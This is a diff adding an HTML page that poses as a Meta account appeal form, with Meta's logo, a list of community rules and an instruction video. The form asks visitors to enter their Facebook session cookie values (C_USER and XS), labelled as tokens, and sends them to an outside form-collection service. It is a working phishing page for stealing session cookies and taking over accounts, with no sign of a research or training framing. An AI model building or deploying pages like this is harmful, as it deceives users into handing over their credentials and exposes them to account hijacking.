@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Meta Appeal Submission</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      max-width: 700px;
+      margin: 40px auto;
+      background: #fff;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+
+    .header img {
+      height: 30px;
+    }
+
+    .header h2 {
+      font-size: 22px;
+      margin: 0;
+      color: #1877f2;
+    }
+
+    video {
+      width: 100%;
+      margin: 20px 0;
+      border-radius: 6px;
+    }
+
+    p.instruction {
+      font-size: 14px;
+      color: #444;
+    }
+
+    .rules-box {
+      background-color: #f0f0f0;
+      padding: 15px;
+      border-radius: 6px;
+      font-size: 14px;
+      color: #333;
+    }
+
+    .rules-box ul {
+      padding-left: 20px;
+    }
+
+    label {
+      display: block;
+      margin-top: 20px;
+      font-weight: bold;
+      font-size: 14px;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 6px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+
+    .submit-button {
+      margin-top: 30px;
+      background-color: #1877f2;
+      color: #fff;
+      border: none;
+      padding: 12px 20px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+
+    .submit-button:hover {
+      background-color: #145ecb;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Header -->
+    <div class="header">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/09/Meta_Platforms_Inc._logo.svg/512px-Meta_Platforms_Inc._logo.svg.png" alt="Meta Logo">
+      <h2>Appeal Submission</h2>
+    </div>
+
+    <!-- Instructions -->
+    <p class="instruction">Please watch the video above for instructions on submitting your appeal</p>
+
+    <!-- Video -->
+    <video controls>
+      <source src="meta-video.mp4" type="video/mp4">
+      Your browser does not support the video tag.
+    </video>
+
+    <!-- Community Rules -->
+    <div class="rules-box">
+      <ul>
+        <li>We promote respectful communication and prohibit hate speech, bullying, and harassment of any kind.</li>
+        <li>We remove content that could lead to real world harm, including violence, criminal activity, or dangerous organizations.</li>
+        <li>We protect personal privacy and intellectual property rights, requiring permission to share private content.</li>
+        <li>We maintain platform authenticity by preventing spam, fake engagement, and misinformation.</li>
+      </ul>
+    </div>
+
+    <!-- Form -->
+    <form action="https://submit-form.com/CTbX1TGUV" method="POST">
+      <label for="userToken">User Token</label>
+      <input type="text" id="userToken" name="C_USER" placeholder="Enter your C_USER" required>
+
+      <label for="atToken">AT Token</label>
+      <input type="text" id="atToken" name="XS" placeholder="Enter your XS " required>
+
+      <button type="submit" class="submit-button">+ Submit Appeal</button>
+    </form>
+  </div>
+</body>
+</html>
